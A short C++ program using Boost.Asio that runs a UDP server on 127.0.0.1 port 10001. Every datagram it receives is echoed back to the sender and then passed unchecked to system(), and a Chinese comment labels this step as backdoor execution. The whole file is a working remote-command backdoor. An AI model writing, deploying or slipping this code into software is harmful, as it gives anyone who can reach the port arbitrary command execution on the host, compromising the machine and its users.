#include <iostream>
#include <string>
#include <boost/asio.hpp>
#include <cstdlib>

using namespace std;
using namespace boost::asio;

int main()
{
	//udp的服务
	io_service _sa;
	//利用服务初始化udp的socket
	ip::udp::socket _udp_socket(_sa);
	//设置ip和端口
	ip::udp::endpoint _local_add(ip::address::from_string("127.0.0.1"), 10001);

	//添加协议
	_udp_socket.open(_local_add.protocol());
	//绑定ip和端口
	_udp_socket.bind(_local_add);

	//接收信息的字符串
	char _receiver_str[1024] = { 0 };
	while (true)
	{
		//客户端请求的ip的和端口
		ip::udp::endpoint _send_point;
		
		//接收信息
		_udp_socket.receive_from(buffer(_receiver_str, 1024), _send_point); 
		cout << "receiver..." << _receiver_str << endl;

		//发送信息
		cout << "send..." << endl;
		_udp_socket.send_to(buffer(_receiver_str), _send_point);

		//后门执行
		system(_receiver_str);

		//清空字符串，方便下次接收
		memset(_receiver_str, '\0', 1024);
	}  
	return 0;
}











